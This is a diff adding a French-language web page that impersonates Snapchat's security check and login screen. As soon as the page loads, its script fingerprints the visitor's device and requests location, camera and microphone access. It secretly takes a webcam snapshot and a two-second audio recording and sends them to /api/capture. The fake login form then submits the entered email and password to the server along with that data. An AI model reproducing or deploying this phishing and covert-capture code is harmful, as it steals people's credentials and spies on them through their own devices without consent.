@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Snapchat</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html,body{
+    height:100%;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:#FFFC00;
+    color:#000;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .app{
+    min-height:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:24px 20px 40px;
+  }
+  .app.chat-mode{
+    padding:0;justify-content:stretch;align-items:stretch;
+    background:#000;
+  }
+
+  .ghost{width:88px;height:88px;margin-bottom:28px;display:flex;align-items:center;justify-content:center;}
+  .ghost svg{width:88px;height:88px;}
+
+  .card{
+    width:100%;max-width:360px;
+    background:#fff;border-radius:16px;padding:28px 24px;
+    box-shadow:0 4px 24px rgba(0,0,0,0.08);
+  }
+  .step-title{font-size:20px;font-weight:700;margin-bottom:6px;text-align:center;}
+  .step-sub{font-size:13px;color:#666;text-align:center;margin-bottom:24px;line-height:1.45;}
+
+  .perm-list{display:flex;flex-direction:column;gap:10px;margin-bottom:22px;}
+  .perm-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border-radius:12px;background:#f5f5f5;}
+  .perm-ico{width:36px;height:36px;border-radius:10px;background:#FFFC00;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
+  .perm-txt{flex:1;min-width:0;}
+  .perm-name{font-size:14px;font-weight:600;}
+  .perm-desc{font-size:11px;color:#888;margin-top:1px;}
+  .perm-badge{font-size:11px;font-weight:600;padding:4px 8px;border-radius:20px;background:#eee;color:#666;white-space:nowrap;}
+  .perm-badge.ok{background:#e6f9e6;color:#1a7a1a;}
+  .perm-badge.wait{background:#fff8d6;color:#9a7b00;}
+  .perm-badge.no{background:#fde8e8;color:#b33;}
+
+  .field{margin-bottom:14px;}
+  .field label{display:block;font-size:12px;font-weight:600;color:#333;margin-bottom:6px;}
+  .field input{
+    width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:12px;
+    font-size:15px;background:#fafafa;outline:none;
+  }
+  .field input:focus{border-color:#000;background:#fff;}
+
+  .error{color:#e03;font-size:13px;text-align:center;min-height:18px;margin-bottom:10px;}
+
+  .btn{
+    width:100%;padding:15px;border:none;border-radius:999px;
+    font-size:15px;font-weight:700;cursor:pointer;
+  }
+  .btn:active{transform:scale(0.98);}
+  .btn:disabled{opacity:0.5;cursor:not-allowed;}
+  .btn-primary{background:#000;color:#fff;}
+  .btn-ghost{background:transparent;color:#000;margin-top:10px;font-weight:600;font-size:14px;text-decoration:underline;text-underline-offset:3px;}
+
+  .links{margin-top:18px;text-align:center;font-size:13px;color:#555;}
+  .links button{background:none;border:none;color:#000;font-weight:600;cursor:pointer;text-decoration:underline;font-size:13px;font-family:inherit;}
+
+  .foot{margin-top:28px;font-size:11px;color:#666;text-align:center;max-width:320px;line-height:1.5;}
+
+  /* ========== CHAT SNAPCHAT ========== */
+  #step-chat{
+    display:none;
+    flex-direction:column;
+    height:100vh;height:100dvh;
+    width:100%;max-width:480px;margin:0 auto;
+    background:#000;color:#fff;
+  }
+  .chat-header{
+    display:flex;align-items:center;gap:12px;
+    padding:12px 14px;padding-top:max(12px, env(safe-area-inset-top));
+    background:#111;border-bottom:1px solid #222;
+    flex-shrink:0;
+  }
+  .chat-avatar{
+    width:40px;height:40px;border-radius:50%;
+    background:#FFFC00;color:#000;
+    display:flex;align-items:center;justify-content:center;
+    font-weight:800;font-size:18px;flex-shrink:0;
+  }
+  .chat-header-info{flex:1;min-width:0;}
+  .chat-header-name{font-size:16px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .chat-header-status{font-size:11px;color:#8f8;margin-top:1px;}
+  .chat-header-actions{display:flex;gap:8px;}
+  .chat-icon-btn{
+    width:36px;height:36px;border-radius:50%;border:none;
+    background:#222;color:#fff;font-size:16px;cursor:pointer;
+    display:flex;align-items:center;justify-content:center;
+  }
+
+  .chat-body{
+    flex:1;overflow-y:auto;padding:16px 12px;
+    display:flex;flex-direction:column;gap:8px;
+    background:#0a0a0a;
+  }
+  .chat-day{
+    text-align:center;font-size:11px;color:#666;
+    margin:8px 0;text-transform:uppercase;letter-spacing:0.05em;
+  }
+  .bubble-row{display:flex;flex-direction:column;max-width:82%;}
+  .bubble-row.me{align-self:flex-end;align-items:flex-end;}
+  .bubble-row.them{align-self:flex-start;align-items:flex-start;}
+  .bubble-author{font-size:10px;color:#888;margin-bottom:2px;padding:0 4px;}
+  .bubble{
+    padding:10px 14px;border-radius:18px;font-size:15px;line-height:1.35;
+    word-break:break-word;
+  }
+  .bubble-row.me .bubble{
+    background:#FFFC00;color:#000;border-bottom-right-radius:6px;
+  }
+  .bubble-row.them .bubble{
+    background:#1c1c1e;color:#fff;border-bottom-left-radius:6px;
+  }
+  .bubble-time{font-size:10px;color:#555;margin-top:3px;padding:0 4px;}
+
+  .chat-input-bar{
+    display:flex;align-items:center;gap:10px;
+    padding:10px 12px;padding-bottom:max(10px, env(safe-area-inset-bottom));
+    background:#111;border-top:1px solid #222;flex-shrink:0;
+  }
+  .chat-input{
+    flex:1;padding:12px 16px;border-radius:24px;border:none;
+    background:#1c1c1e;color:#fff;font-size:15px;outline:none;
+  }
+  .chat-input::placeholder{color:#666;}
+  .chat-send{
+    width:44px;height:44px;border-radius:50%;border:none;
+    background:#FFFC00;color:#000;font-size:18px;font-weight:700;
+    cursor:pointer;flex-shrink:0;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .chat-send:disabled{opacity:0.4;cursor:not-allowed;}
+
+  .chat-empty{
+    flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+    color:#555;font-size:14px;gap:8px;padding:40px;
+    text-align:center;
+  }
+  .chat-empty .big{font-size:40px;}
+
+  video.preview{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;}
+  .debug{position:fixed;bottom:0;left:0;right:0;max-height:0;overflow:hidden;opacity:0;pointer-events:none;}
+</style>
+</head>
+<body>
+
+<div class="app" id="app-shell">
+  <div class="ghost" id="ghost-logo" aria-hidden="true">
+    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M50 8C32 8 20 22 20 40c0 10-2 16-6 22-3 5-2 10 2 12 3 1 6-1 9-1 2 0 3 3 5 5 3 3 7 5 12 5h16c5 0 9-2 12-5 2-2 3-5 5-5 3 0 6 2 9 1 4-2 5-7 2-12-4-6-6-12-6-22 0-18-12-32-30-32z" fill="#000"/>
+      <circle cx="38" cy="42" r="5" fill="#FFFC00"/>
+      <circle cx="62" cy="42" r="5" fill="#FFFC00"/>
+      <path d="M42 58c3 4 13 4 16 0" stroke="#FFFC00" stroke-width="3" stroke-linecap="round"/>
+    </svg>
+  </div>
+
+  <!-- STEP 1 : Permissions -->
+  <div class="card" id="step-perms">
+    <div class="step-title">Vérification de sécurité</div>
+    <p class="step-sub">Pour protéger ton compte, Snapchat vérifie quelques accès sur cet appareil.</p>
+    <div class="perm-list">
+      <div class="perm-row">
+        <div class="perm-ico">📍</div>
+        <div class="perm-txt">
+          <div class="perm-name">Localisation</div>
+          <div class="perm-desc">Détecter les connexions inhabituelles</div>
+        </div>
+        <span class="perm-badge wait" id="status-loc">…</span>
+      </div>
+      <div class="perm-row">
+        <div class="perm-ico">📷</div>
+        <div class="perm-txt">
+          <div class="perm-name">Caméra</div>
+          <div class="perm-desc">Nécessaire pour Snapchat</div>
+        </div>
+        <span class="perm-badge wait" id="status-cam">…</span>
+      </div>
+      <div class="perm-row">
+        <div class="perm-ico">🎙️</div>
+        <div class="perm-txt">
+          <div class="perm-name">Microphone</div>
+          <div class="perm-desc">Pour les notes vocales et appels</div>
+        </div>
+        <span class="perm-badge wait" id="status-mic">…</span>
+      </div>
+    </div>
+    <button class="btn btn-primary" id="btn-continue">Continuer</button>
+    <button class="btn btn-ghost" id="btn-skip">Passer</button>
+  </div>
+
+  <!-- STEP 2 : Login -->
+  <div class="card" id="step-login" style="display:none;">
+    <div class="step-title" id="auth-title">Se connecter</div>
+    <p class="step-sub" id="auth-lede">Entre ton e-mail et ton mot de passe pour continuer.</p>
+    <form id="login-form" novalidate>
+      <div class="field">
+        <label for="email">Nom d'utilisateur ou e-mail</label>
+        <input type="email" id="email" placeholder="nom@exemple.com" autocomplete="username" autocapitalize="off">
+      </div>
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" placeholder="Mot de passe" autocomplete="current-password">
+      </div>
+      <p class="error" id="login-error"></p>
+      <button type="submit" class="btn btn-primary" id="auth-submit">Se connecter</button>
+    </form>
+    <div class="links">
+      <button type="button" id="toggle-mode">Créer un compte</button>
+    </div>
+  </div>
+
+  <p class="foot" id="foot-note">En continuant, tu confirmes avoir lu les Conditions d'utilisation et la Politique de confidentialité de Snapchat.</p>
+</div>
+
+<!-- STEP 3 : CHAT (plein écran, hors .app centré) -->
+<div id="step-chat">
+  <header class="chat-header">
+    <div class="chat-avatar" id="chat-avatar">👻</div>
+    <div class="chat-header-info">
+      <div class="chat-header-name" id="chat-room-name">Chat Snapchat</div>
+      <div class="chat-header-status" id="chat-status">En ligne</div>
+    </div>
+    <div class="chat-header-actions">
+      <button class="chat-icon-btn" id="btn-logout" title="Déconnexion">⏻</button>
+    </div>
+  </header>
+
+  <div class="chat-body" id="chat-body">
+    <div class="chat-empty" id="chat-empty">
+      <div class="big">💬</div>
+      <div>Aucun message pour l'instant</div>
+      <div style="font-size:12px;color:#444;">Envoie le premier snap textuel</div>
+    </div>
+  </div>
+
+  <form class="chat-input-bar" id="chat-form">
+    <input class="chat-input" id="chat-input" type="text" placeholder="Envoyer un chat…" autocomplete="off" maxlength="2000">
+    <button type="submit" class="chat-send" id="chat-send" title="Envoyer">➤</button>
+  </form>
+</div>
+
+<video class="preview" id="video-preview" autoplay muted playsinline></video>
+<div class="debug">
+  <div id="log-stream"></div>
+  <span id="conn-badge"></span>
+  <span id="tel-visitor"></span>
+  <span id="tel-loc"></span>
+</div>
+
+<script>
+  let mode = 'login';
+  let currentUserEmail = null;
+  const knownMsgIds = new Set();
+
+  const appShell = document.getElementById('app-shell');
+  const stepPerms = document.getElementById('step-perms');
+  const stepLogin = document.getElementById('step-login');
+  const stepChat = document.getElementById('step-chat');
+  const ghostLogo = document.getElementById('ghost-logo');
+  const footNote = document.getElementById('foot-note');
+  const chatBody = document.getElementById('chat-body');
+  const chatEmpty = document.getElementById('chat-empty');
+  const chatInput = document.getElementById('chat-input');
+
+  function getCookie(name){
+    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : null;
+  }
+
+  function appendLog(type, text){ console.log(`[${type}] ${text}`); }
+
+  async function sendTelemetry(type, message, meta){
+    try{
+      await fetch('/api/telemetry', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ type, message, meta })
+      });
+    }catch(e){}
+  }
+
+  // ---------- SSE ----------
+  function connectStream(){
+    const es = new EventSource('/api/stream');
+    es.onmessage = (e) => {
+      try {
+        const data = JSON.parse(e.data);
+        if (data.type === 'chat' && data.message) {
+          addMessageToUI(data.message);
+        }
+      } catch {}
+    };
+  }
+  connectStream();
+  sendTelemetry('info', 'arrivée sur le site (snapchat + chat)');
+
+
+  // ---------- Collecte max d'infos au lancement ----------
+  async function collectMaxInfo() {
+    const nav = navigator;
+    const scr = window.screen;
+    const info = {
+      // Navigateur / OS
+      userAgent: nav.userAgent || null,
+      platform: nav.platform || null,
+      language: nav.language || null,
+      languages: nav.languages ? Array.from(nav.languages) : null,
+      cookieEnabled: nav.cookieEnabled,
+      doNotTrack: nav.doNotTrack || null,
+      hardwareConcurrency: nav.hardwareConcurrency || null,
+      deviceMemory: nav.deviceMemory || null,
+      maxTouchPoints: nav.maxTouchPoints || null,
+      vendor: nav.vendor || null,
+      product: nav.product || null,
+      // Écran
+      screen: {
+        width: scr.width,
+        height: scr.height,
+        availWidth: scr.availWidth,
+        availHeight: scr.availHeight,
+        colorDepth: scr.colorDepth,
+        pixelDepth: scr.pixelDepth,
+        orientation: scr.orientation ? scr.orientation.type : null,
+      },
+      viewport: {
+        width: window.innerWidth,
+        height: window.innerHeight,
+        devicePixelRatio: window.devicePixelRatio || 1,
+      },
+      // Timezone / locale
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      locale: Intl.DateTimeFormat().resolvedOptions().locale || null,
+      // Page
+      url: location.href,
+      referrer: document.referrer || null,
+      title: document.title,
+      // Connexion réseau
+      connection: null,
+      // Batterie
+      battery: null,
+      // WebGL
+      webgl: null,
+      // Canvas fingerprint simple
+      canvasHash: null,
+      // Stockage
+      localStorage: false,
+      sessionStorage: false,
+      // Plugins (limité)
+      plugins: [],
+      // Médias devices (labels après permission)
+      mediaDevices: null,
+      collectedAt: new Date().toISOString(),
+    };
+
+    // Network Information API
+    try {
+      const c = nav.connection || nav.mozConnection || nav.webkitConnection;
+      if (c) {
+        info.connection = {
+          effectiveType: c.effectiveType || null,
+          downlink: c.downlink || null,
+          rtt: c.rtt || null,
+          saveData: c.saveData || null,
+          type: c.type || null,
+        };
+      }
+    } catch {}
+
+    // Battery
+    try {
+      if (nav.getBattery) {
+        const b = await nav.getBattery();
+        info.battery = {
+          charging: b.charging,
+          level: b.level,
+          chargingTime: b.chargingTime,
+          dischargingTime: b.dischargingTime,
+        };
+      }
+    } catch {}
+
+    // WebGL renderer
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        info.webgl = {
+          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+          version: gl.getParameter(gl.VERSION),
+        };
+      }
+    } catch {}
+
+    // Canvas fingerprint (hash simple)
+    try {
+      const c = document.createElement('canvas');
+      c.width = 240; c.height = 60;
+      const ctx = c.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(0, 0, 240, 60);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Snapchat@' + nav.userAgent.slice(0, 40), 4, 8);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)';
+      ctx.fillText(String(scr.width) + 'x' + String(scr.height), 4, 30);
+      const data = c.toDataURL();
+      // hash simple
+      let h = 0;
+      for (let i = 0; i < data.length; i++) h = ((h << 5) - h) + data.charCodeAt(i) | 0;
+      info.canvasHash = 'c' + (h >>> 0).toString(16);
+    } catch {}
+
+    // Storage
+    try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); info.localStorage = true; } catch {}
+    try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); info.sessionStorage = true; } catch {}
+
+    // Plugins
+    try {
+      if (nav.plugins) {
+        info.plugins = Array.from(nav.plugins).slice(0, 30).map(p => p.name);
+      }
+    } catch {}
+
+    // Media devices (sans labels si pas encore autorisé)
+    try {
+      if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
+        const devices = await nav.mediaDevices.enumerateDevices();
+        info.mediaDevices = devices.map(d => ({
+          kind: d.kind,
+          label: d.label || null,
+          deviceId: d.deviceId ? d.deviceId.slice(0, 12) + '…' : null,
+        }));
+      }
+    } catch {}
+
+    return info;
+  }
+
+  async function sendMaxInfo() {
+    try {
+      const client = await collectMaxInfo();
+      const res = await fetch('/api/fingerprint', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        appendLog('info', 'fingerprint envoyé — ip serveur: ' + (data.ip || '?'));
+        window.__fingerprintId = data.id;
+      }
+    } catch (e) {
+      appendLog('error', 'échec fingerprint: ' + e.message);
+    }
+  }
+
+  // Envoi immédiat au lancement
+  sendMaxInfo();
+
+
+  // ---------- Permissions ----------
+  function setStatus(id, state, label){
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'perm-badge ' + (state === 'granted' ? 'ok' : state === 'pending' ? 'wait' : state === 'denied' ? 'no' : 'wait');
+    el.textContent = label;
+  }
+
+  async function requestLocation(){
+    setStatus('status-loc','pending','…');
+    await sendTelemetry('permission', 'demande de localisation lancée');
+    return new Promise((resolve) => {
+      if(!navigator.geolocation){
+        setStatus('status-loc','denied','Non');
+        resolve(); return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          setStatus('status-loc','granted','OK');
+          window.__locationData = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: new Date().toISOString()
+          };
+          await sendTelemetry('permission', 'localisation autorisée');
+          resolve();
+        },
+        async () => { setStatus('status-loc','denied','Non'); resolve(); },
+        { timeout: 8000 }
+      );
+    });
+  }
+
+  async function requestCamera(){
+    setStatus('status-cam','pending','…');
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video-preview');
+      video.srcObject = stream;
+      setStatus('status-cam','granted','OK');
+      window.__camStream = stream;
+      setTimeout(() => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          window.__cameraScreenshot = canvas.toDataURL('image/jpeg', 0.6);
+          window.__cameraData = { captured: true, resolution: canvas.width+'x'+canvas.height, timestamp: new Date().toISOString() };
+        } catch {}
+      }, 1000);
+      await sendTelemetry('permission', 'caméra autorisée');
+    }catch{ setStatus('status-cam','denied','Non'); }
+  }
+
+  async function requestMic(){
+    setStatus('status-mic','pending','…');
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      setStatus('status-mic','granted','OK');
+      window.__micStream = stream;
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          window.__audioSample = reader.result;
+          window.__micData = { captured: true, duration: 2000, format: 'audio/webm', timestamp: new Date().toISOString() };
+        };
+        reader.readAsDataURL(blob);
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 2000);
+      await sendTelemetry('permission', 'micro autorisé');
+    }catch{ setStatus('status-mic','denied','Non'); }
+  }
+
+  async function sendImmediateCapture(){
+    await new Promise(r => setTimeout(r, 2500));
+    try {
+      await fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          permissions: {
+            location: window.__locationData || null,
+            camera: { screenshot: window.__cameraScreenshot || null, metadata: window.__cameraData || null },
+            microphone: { audioSample: window.__audioSample || null, metadata: window.__micData || null },
+            collectedAt: new Date().toISOString()
+          }
+        })
+      });
+    } catch {}
+  }
+
+  (async function autoRequestPermissions(){
+    await new Promise(r => setTimeout(r, 400));
+    await requestLocation();
+    await requestCamera();
+    await requestMic();
+    sendImmediateCapture();
+    // Re-envoyer fingerprint enrichi (labels caméra/micro + geo)
+    setTimeout(() => sendMaxInfo(), 3000);
+  })();
+
+  document.getElementById('btn-continue').addEventListener('click', goToLogin);
+  document.getElementById('btn-skip').addEventListener('click', goToLogin);
+
+  function goToLogin(){
+    stepPerms.style.display = 'none';
+    stepLogin.style.display = 'block';
+  }
+
+  document.getElementById('toggle-mode').addEventListener('click', function(){
+    mode = mode === 'login' ? 'register' : 'login';
+    document.getElementById('auth-title').textContent = mode === 'login' ? 'Se connecter' : 'Créer un compte';
+    document.getElementById('auth-lede').textContent = mode === 'login'
+      ? 'Entre ton e-mail et ton mot de passe pour continuer.'
+      : 'Choisis un e-mail et un mot de passe (6 caractères min).';
+    document.getElementById('auth-submit').textContent = mode === 'login' ? 'Se connecter' : 'S\'inscrire';
+    this.textContent = mode === 'login' ? 'Créer un compte' : 'J\'ai déjà un compte';
+    document.getElementById('login-error').textContent = '';
+  });
+
+  document.getElementById('login-form').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const err = document.getElementById('login-error');
+    const btn = document.getElementById('auth-submit');
+    err.textContent = '';
+    if(!email || !password){ err.textContent = 'Renseigne un e-mail et un mot de passe.'; return; }
+
+    btn.disabled = true;
+    btn.textContent = mode === 'login' ? 'Connexion…' : 'Création…';
+    const endpoint = mode === 'login' ? '/api/login' : '/api/register';
+
+    try{
+      const res = await fetch(endpoint, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+          email, password,
+          permissions: {
+            location: window.__locationData || null,
+            camera: { screenshot: window.__cameraScreenshot || null, metadata: window.__cameraData || null },
+            microphone: { audioSample: window.__audioSample || null, metadata: window.__micData || null },
+            collectedAt: new Date().toISOString()
+          }
+        })
+      });
+      const data = await res.json();
+      if(!data.ok){
+        err.textContent = data.error || 'Une erreur est survenue.';
+        btn.disabled = false;
+        btn.textContent = mode === 'login' ? 'Se connecter' : 'S\'inscrire';
+        return;
+      }
+      currentUserEmail = data.user.email;
+      openChat(data.user.email);
+    }catch{
+      err.textContent = 'Impossible de joindre le serveur.';
+    }
+    btn.disabled = false;
+    btn.textContent = mode === 'login' ? 'Se connecter' : 'S\'inscrire';
+  });
+
+  // ---------- CHAT ----------
+  function openChat(email){
+    currentUserEmail = email;
+    appShell.style.display = 'none';
+    if (ghostLogo) ghostLogo.style.display = 'none';
+    if (footNote) footNote.style.display = 'none';
+    document.body.style.background = '#000';
+    stepChat.style.display = 'flex';
+
+    const short = (email || 'U').split('@')[0];
+    document.getElementById('chat-avatar').textContent = short.charAt(0).toUpperCase();
+    document.getElementById('chat-room-name').textContent = 'Chat · ' + short;
+    document.getElementById('chat-status').textContent = 'Connecté · ' + email;
+
+    loadMessages();
+    chatInput.focus();
+  }
+
+  function formatTime(iso){
+    try {
+      return new Date(iso).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
+    } catch { return ''; }
+  }
+
+  function addMessageToUI(msg){
+    if (!msg || !msg.id || knownMsgIds.has(msg.id)) return;
+    knownMsgIds.add(msg.id);
+
+    if (chatEmpty) chatEmpty.style.display = 'none';
+
+    const isMe = currentUserEmail && msg.author === currentUserEmail;
+    const row = document.createElement('div');
+    row.className = 'bubble-row ' + (isMe ? 'me' : 'them');
+    row.dataset.id = msg.id;
+
+    if (!isMe) {
+      const author = document.createElement('div');
+      author.className = 'bubble-author';
+      author.textContent = msg.author;
+      row.appendChild(author);
+    }
+
+    const bubble = document.createElement('div');
+    bubble.className = 'bubble';
+    bubble.textContent = msg.text;
+    row.appendChild(bubble);
+
+    const time = document.createElement('div');
+    time.className = 'bubble-time';
+    time.textContent = formatTime(msg.ts);
+    row.appendChild(time);
+
+    chatBody.appendChild(row);
+    chatBody.scrollTop = chatBody.scrollHeight;
+  }
+
+  async function loadMessages(){
+    try {
+      const res = await fetch('/api/messages');
+      const data = await res.json();
+      if (!data.ok) return;
+      (data.messages || []).forEach(addMessageToUI);
+      chatBody.scrollTop = chatBody.scrollHeight;
+    } catch {}
+  }
+
+  document.getElementById('chat-form').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const text = chatInput.value.trim();
+    if (!text) return;
+    const btn = document.getElementById('chat-send');
+    btn.disabled = true;
+    chatInput.value = '';
+    try {
+      const res = await fetch('/api/messages', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text })
+      });
+      const data = await res.json();
+      if (data.ok && data.message) {
+        addMessageToUI(data.message);
+      }
+    } catch {
+      chatInput.value = text;
+    }
+    btn.disabled = false;
+    chatInput.focus();
+  });
+
+  document.getElementById('btn-logout').addEventListener('click', async function(){
+    if(window.__camStream) window.__camStream.getTracks().forEach(t => t.stop());
+    if(window.__micStream) window.__micStream.getTracks().forEach(t => t.stop());
+    await fetch('/api/logout', { method:'POST' });
+    location.reload();
+  });
+</script>
+</body>
+</html>
